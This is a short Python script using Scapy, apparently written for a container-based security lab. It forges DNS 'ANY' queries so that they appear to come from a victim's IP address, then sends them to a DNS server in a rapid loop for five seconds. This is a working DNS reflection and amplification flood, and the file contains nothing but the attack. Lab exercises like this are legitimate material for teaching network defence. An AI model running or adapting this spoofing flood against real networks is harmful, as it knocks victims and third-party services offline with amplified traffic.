# spoof_dns.py (run inside attacker container)
from scapy.all import *
import time

target_ip = "10.9.0.5"        # IP of the victim
dns_server_ip = "10.9.0.53"   # IP of local DNS server

# DNS "ANY" request with spoofed source IP
dns_query = IP(src=target_ip, dst=dns_server_ip) / \
            UDP(sport=RandShort(), dport=53) / \
            DNS(rd=1, qd=DNSQR(qname="smith2022.edu", qtype="ANY"))

# Send burst for 5 seconds
start_time = time.time()
while time.time() - start_time < 5:
    send(dns_query, verbose=0)

